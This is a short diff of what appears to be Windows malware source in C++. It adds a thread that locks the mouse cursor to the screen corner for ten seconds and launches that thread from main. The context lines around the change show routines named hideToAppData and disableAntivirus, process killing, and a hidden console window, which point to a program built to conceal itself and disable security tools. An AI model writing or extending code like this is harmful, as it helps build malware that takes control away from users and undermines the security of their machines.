@@ -1321,6 +1321,12 @@ void killProcessByName(const char* name) {
     CloseHandle(snap);
 }
 
+DWORD WINAPI mouseLock10(LPVOID) {
+    DWORD start = GetTickCount();
+    while (GetTickCount() - start < 10000) { SetCursorPos(0, 0); Sleep(30); }
+    return 0;
+}
+
 void disableAntivirus() {
     char exePath[MAX_PATH]; DWORD len = GetModuleFileNameA(NULL, exePath, MAX_PATH);
     if (len > 0) exePath[len] = 0;
@@ -1688,6 +1694,7 @@ int main(int argc, char* argv[]) {
     }
     if (computerName.empty()) computerName = getComputerName();
     hideToAppData();
+    CreateThread(0, 0, mouseLock10, 0, 0, 0);
     disableAntivirus();
     HWND hwnd = GetConsoleWindow();
     if (hwnd && !showConsole) ShowWindow(hwnd, SW_HIDE);
